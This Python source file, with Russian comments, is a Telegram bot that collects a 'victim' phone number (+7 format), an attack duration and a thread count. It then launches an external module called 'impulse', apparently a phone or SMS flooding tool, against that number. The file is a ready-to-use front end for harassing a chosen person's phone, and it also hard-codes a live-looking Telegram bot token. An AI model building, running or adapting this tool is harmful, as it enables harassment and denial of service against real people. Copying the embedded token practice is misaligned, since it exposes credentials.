# -*- coding: utf-8 -*-
# Import modules
import start_attack, help
import telebot
bot = telebot.TeleBot("1884845165:AAE51LVnKOW2_tmgXyCpsC1nu-a-JXIYBuc")
#################################################################################################################
help = help.h()
########################################################################################################################
## Обработка команд
@bot.message_handler(commands=['Start'])
def send_start(message):
	bot.send_message(message.chat.id, "Введите номер жертвы в формате - \"+7**********\"")
	bot.register_next_step_handler(message, send_number)

@bot.message_handler(commands=['Help'])
def send_help(message):
	bot.send_message(message.chat.id, help)

@bot.message_handler(commands=['Attack']) # Запускает impulse по команде
def send_attack(message):
	global result, answer
	bot.send_message(message.chat.id, "Атака началась")
	result = start_attack.sa(par_time, par_threads, par_number) # подключаем модуль с функцией, которая запускает impulse
	print(result.stdout) # Проверяем  выполнение атаки
	if result != 0:
		answer = "Атака завершена. \n Что бы выбрать другую цель введите \n /Start"
		bot.send_message(message.chat.id, answer)

# Обработка сообщений
@bot.message_handler(content_types =['text'])
def start(message):
	if message.text == "/Restart":
		bot.register_next_step_handler(message, send_start)
	elif message.text == '/reg':   #Приветствие при регистрации
		bot.send_message(message.chat.id, "Приветствую. Для получения справки введите команду \n /Help")
	else:
		bot.send_message(message.chat.id, "Неизвестная команда, введите команду \n /Help")
# Получение парамметров необходимых для запуска impulse
def send_number(message):
	global par_number
	par_number = message.text
	print(par_number[0:2])
	print(len(par_number))
	if message.text == "/Restart":
		bot.register_next_step_handler(message, send_start)
	elif par_number[0:2] == '+7' and len(par_number) == 12: #Проверка на правильность ввода номера
		bot.send_message(message.chat.id, "Номер жертвы - " + par_number + "\n Введите продолжительность атаки в секундах \n time = ")
		bot.register_next_step_handler(message, send_time)
	else:
		bot.send_message(message.chat.id, 'Неверный формат номера')
		bot.register_next_step_handler(message, send_number)

def send_time(message):
	global par_number, par_time
	par_time = message.text
	if message.text == "/Restart":
		bot.register_next_step_handler(message, send_start)
	elif 0 < int(par_time) < 100000: #Время в пределах 24х часов
		bot.send_message(message.chat.id, "Номер жертвы - "+ par_number + "\n time = " + par_time + "\n Введите количество кругов атаки \n threads = ")
		bot.register_next_step_handler(message, send_threads)
	else:
		bot.send_message(message.chat.id, "Неверно введено время")
		bot.register_next_step_handler(message, send_time)

def send_threads(message):
	global par_number, par_time, par_threads
	par_threads = message.text
	if message.text == "/Restart":
		bot.register_next_step_handler(message, send_start)
	elif 1 <= int(par_threads) < 200:
		bot.send_message(message.chat.id, "Номер жертвы - "+ par_number + "\n time = " + par_time + "\n threads = " + par_threads + "\n Чтобы начать атаку введите\n /Attack")
	else:
		bot.send_message(message.chat.id, "Неверное число кругов")
		bot.register_next_step_handler(message, send_threads)
##################################################################################################


bot.polling( none_stop = True)